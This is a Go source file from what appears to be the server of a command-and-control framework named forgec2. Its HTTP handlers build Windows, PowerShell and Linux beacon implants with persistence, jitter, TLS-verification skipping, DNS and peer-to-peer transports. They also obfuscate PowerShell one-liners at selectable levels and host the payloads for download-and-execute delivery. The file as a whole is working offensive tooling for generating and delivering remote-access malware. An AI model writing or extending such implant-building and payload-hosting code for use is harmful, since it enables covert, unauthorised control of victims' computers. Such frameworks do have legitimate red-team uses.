package server

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/forgec2/forgec2/internal/obfuscation"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/forgec2/forgec2/internal/util"
	"github.com/gin-gonic/gin"
)

// sha256OfFile returns the hex SHA-256 and size of the hosted payload so
// operators can verify resumed/relayed downloads before executing them.
func sha256OfFile(path string) (string, int64) {
	data, err := os.ReadFile(path)
	if err != nil {
		return "", 0
	}
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:]), int64(len(data))
}

func (s *Server) handleGeneratePS1(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
		BeaconKey     string `form:"beacon_key"`
		// Obfuscation selects the PowerShell one-liner preset:
		// ""/none (legacy), light, standard, heavy. Empty = legacy.
		Obfuscation string `form:"obfuscation"`
	}
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return
	}

	// Listener is required
	if form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener is required")
		return
	}

	resolved, err := s.resolveListener(form.ListenerID)
	if err != nil {
		respondError(c, http.StatusBadRequest, "Invalid listener configuration")
		return
	}
	form.C2URL = resolved.C2URL
	form.Protocol = resolved.Protocol

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	beaconKey := form.BeaconKey
	if beaconKey == "" {
		beaconKey = s.serverBeaconKey()
	}

	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey, s.currentTenantID(c))
	if err != nil {
		// Keep the raw error in the log: it names key material and paths, which
		// must not travel to the client even for an authenticated operator.
		slog.Error("Registration secret setup failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Registration secret"))
		return
	}

	cfg := payload.ImplantConfig{
		C2URL:           form.C2URL,
		Protocol:        form.Protocol,
		BeaconTransport: resolved.BeaconTransport,
		Interval:        interval,
		Jitter:          form.Jitter,
		UserAgent:       form.UserAgent,
		Persist:         form.Persist,
		SkipTLSVerify:   form.SkipTLSVerify,
		Filename:        form.Filename,
		Debug:           false,
		Profile:         form.Profile,
		ListenerID:      form.ListenerID,
		Proxy:           form.Proxy,
		CryptoKey:       form.CryptoKey,
		BeaconKey:       beaconKey,
		RegSecretID:     regSecretID,
		RegSecret:       regSecretB64,
	}

	ps1Code, err := payload.GeneratePowerShellSource(cfg, s.implantDataDir())
	if err != nil {
		s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
		return
	}

	oneLiner := obfuscation.GenerateCommandLineOneLinerWithOptions(ps1Code, obfuscation.PresetForLevel(form.Obfuscation))

	s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "success", "", "")
	respond(c, gin.H{

		"code":            oneLiner,
		"original_length": len(ps1Code),
		"obfuscated_len":  len(oneLiner),
		"obfuscation":     form.Obfuscation,
	})
}

// handleGenerateOneLiner generates a payload and returns 10+ one-liner variants
func (s *Server) handleGenerateOneLiner(c *gin.Context) {
	var form struct {
		C2URL           string `form:"c2_url"`
		Protocol        string `form:"protocol"`
		BeaconTransport string `form:"beacon_transport"`
		Interval        int    `form:"interval"`
		Jitter          int    `form:"jitter"`
		BeaconTime      int    `form:"beacon_time"`
		UserAgent       string `form:"user_agent"`
		Persist         bool   `form:"persist"`
		SkipTLSVerify   bool   `form:"skip_tls_verify"`
		Profile         string `form:"profile"`
		ListenerID      uint   `form:"listener_id"`
		PayloadType     string `form:"payload_type"` // "exe", "ps1", "linux"
		Proxy           string `form:"proxy"`
		CryptoKey       string `form:"crypto_key"`
		BeaconKey       string `form:"beacon_key"`
		P2PMode         string `form:"p2p_mode"`
		P2PParent       string `form:"p2p_parent"`
		P2PListenAddr   string `form:"p2p_listen_addr"`
		DNSDomain       string `form:"dns_domain"`
		DNSServer       string `form:"dns_server"`
		// Obfuscation selects the PowerShell one-liner preset for the
		// self-contained Base64 variant: ""/none (legacy), light, standard, heavy.
		Obfuscation string `form:"obfuscation"`
	}
	if err := c.ShouldBind(&form); err != nil {
		respondError(c, http.StatusBadRequest, "Invalid request parameters")
		return
	}

	payloadType := form.PayloadType
	if payloadType == "" {
		payloadType = "exe"
	}

	// Validate and get listener
	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		respondError(c, http.StatusBadRequest, "listener or DNS/P2P config is required")
		return
	}

	if !isP2P && !isDNS {
		resolved, err := s.resolveListener(form.ListenerID)
		if err != nil {
			respondError(c, http.StatusBadRequest, "Invalid listener configuration")
			return
		}
		// The PowerShell template dials exactly one endpoint, so appending a
		// comma-separated failover list would break it. Go-built one-liners
		// (exe/linux) use the same multi-C2 loader as the binary generator.
		if payloadType == "ps1" {
			form.C2URL = resolved.C2URL
		} else {
			merged, err := mergeC2URLList(resolved.C2URL, form.C2URL)
			if err != nil {
				respondError(c, http.StatusBadRequest, "Invalid C2 or failover URL: "+err.Error())
				return
			}
			form.C2URL = merged
		}
		form.Protocol = resolved.Protocol
		form.BeaconTransport = resolved.BeaconTransport
		if resolved.DNSDomain != "" {
			form.DNSDomain = resolved.DNSDomain
			if form.DNSServer == "" {
				form.DNSServer = resolved.DNSServer
			}
		}
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
		form.BeaconTransport = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
		form.BeaconTransport = "tcp"
	}

	beaconKey := form.BeaconKey
	if beaconKey == "" {
		beaconKey = s.serverBeaconKey()
	}

	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey, s.currentTenantID(c))
	if err != nil {
		// Keep the raw error in the log: it names key material and paths, which
		// must not travel to the client even for an authenticated operator.
		slog.Error("Registration secret setup failed", "err", err)
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Registration secret"))
		return
	}

	cfg := payload.ImplantConfig{
		C2URL:           form.C2URL,
		Protocol:        form.Protocol,
		BeaconTransport: form.BeaconTransport,
		Interval:        interval,
		Jitter:          form.Jitter,
		UserAgent:       form.UserAgent,
		Persist:         form.Persist,
		SkipTLSVerify:   form.SkipTLSVerify,
		Filename:        "forgec2_beacon",
		Debug:           false,
		Profile:         form.Profile,
		ListenerID:      form.ListenerID,
		P2PMode:         p2pMode,
		P2PParent:       p2pParent,
		P2PListenAddr:   p2pListenAddr,
		DNSDomain:       form.DNSDomain,
		DNSServer:       form.DNSServer,
		Proxy:           form.Proxy,
		CryptoKey:       form.CryptoKey,
		BeaconKey:       beaconKey,
		RegSecretID:     regSecretID,
		RegSecret:       regSecretB64,
	}

	agentsDir := filepath.Join(s.rawDataDir(), "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	// Generate the payload
	var (
		genPath  string
		genErr   error
		ps1Code  string
		filename string
		format   string
	)
	switch payloadType {
	case "exe":
		genPath, genErr = s.withBuildSlot(func() (string, error) { return payload.GenerateWindowsEXE(cfg, agentsDir) })
		filename = "beacon.exe"
		format = "exe"
	case "ps1":
		ps1Code, genErr = payload.GeneratePowerShellSource(cfg, s.implantDataDir())
		filename = "beacon.ps1"
		format = "ps1"
	case "linux":
		genPath, genErr = s.withBuildSlot(func() (string, error) { return payload.GenerateLinuxELF(cfg, agentsDir) })
		filename = "beacon.elf"
		format = "elf"
	default:
		respondError(c, http.StatusBadRequest, "invalid payload_type, must be exe, ps1, or linux")
		return
	}

	if genErr != nil {
		s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(genErr, "Payload generation"))
		return
	}

	// Copy the payload to the hosted payloads directory for download
	payloadsDir := filepath.Join(s.rawDataDir(), "payloads")
	if err := os.MkdirAll(payloadsDir, 0750); err != nil {
		s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
		return
	}

	payloadID := util.NewString()
	payloadSubDir := filepath.Join(payloadsDir, payloadID)
	if err := os.MkdirAll(payloadSubDir, 0750); err != nil {
		s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
		respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
		return
	}

	hostPath := filepath.Join(payloadSubDir, filename)

	if payloadType == "ps1" {
		if err := os.WriteFile(hostPath, []byte(ps1Code), 0644); err != nil {
			s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
			respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
			return
		}
	} else {
		input, readErr := os.ReadFile(genPath)
		if readErr != nil {
			s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
			respondError(c, http.StatusInternalServerError, sanitizeError(readErr, "Payload generation"))
			return
		}
		if err := os.WriteFile(hostPath, input, 0644); err != nil {
			s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", "build error", "")
			respondError(c, http.StatusInternalServerError, sanitizeError(err, "Payload generation"))
			return
		}
	}

	// Build the download URL from the current request
	scheme := "http"
	if c.Request.TLS != nil {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s", scheme, c.Request.Host)
	payloadURL := fmt.Sprintf("%s/payloads/%s/%s", baseURL, payloadID, filename)

	// Generate one-liner variants (verified variants carry the SHA-256 so the
	// target validates the payload after download/resume, before executing).
	payloadSHA, payloadSize := sha256OfFile(hostPath)
	oneLiners := buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, form.Proxy, payloadSHA, obfuscation.PresetForLevel(form.Obfuscation))

	// The original build artifact in data/agents is a duplicate of the hosted
	// payload copy and is never served again — register it for reaping.
	if genPath != "" {
		s.registerTransientArtifact(genPath)
	}

	s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "success", "", hostPath)
	respond(c, gin.H{

		"payload_id":   payloadID,
		"filename":     filename,
		"download_url": payloadURL,
		"sha256":       payloadSHA,
		"size":         payloadSize,
		"expires_at":   time.Now().Add(HostedPayloadTTL).UTC().Format(time.RFC3339),
		"types":        oneLiners,
	})
}

// handleServePayload serves hosted payload files for one-liner download
func (s *Server) handleServePayload(c *gin.Context) {
	payloadID := c.Param("id")
	filename := c.Param("filename")
	if payloadID == "" || filename == "" {
		c.String(http.StatusBadRequest, "Invalid path")
		return
	}

	dataDir := s.rawDataDir()
	payloadPath := filepath.Join(dataDir, "payloads", payloadID, filename)
	allowedDir := filepath.Join(dataDir, "payloads")
	if err := validateFilePath(payloadPath, allowedDir); err != nil {
		c.String(http.StatusForbidden, "forbidden")
		return
	}
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		c.Status(http.StatusNotFound)
		return
	}
	serveFileSafe(c, payloadPath, allowedDir, filename)
}
